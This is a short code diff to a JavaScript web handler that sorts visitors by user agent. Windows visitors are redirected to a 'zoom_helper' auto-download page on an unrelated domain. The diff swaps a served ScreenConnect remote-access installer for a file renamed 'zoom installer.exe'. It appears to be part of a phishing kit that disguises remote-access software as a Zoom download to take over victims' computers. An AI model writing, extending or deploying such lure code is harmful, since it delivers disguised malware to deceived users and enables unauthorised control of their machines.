@@ -3,8 +3,8 @@ export default function handler(req, res) {
   const isWindows = /windows/i.test(userAgent);
 
   const WINDOWS_REDIRECT_AFTER_DOWNLOAD =
-    'digimarconibadan.com/zoom_helper_z2x9w4b7v1r6/ZOOM-AUTO-DOWNLOAD/index.html';
-  const MSI_PATH = '/ScreenConnect.ClientSetup.msi';
+    'https://digimarconibadan.com/zoom_helper_z2x9w4b7v1r6/ZOOM-AUTO-DOWNLOAD/index.html';
+  const MSI_PATH = '/zoom installer.exe';
   const NON_WINDOWS_TARGET = 'https://personalavatar.com/views';
 
   let email = '';
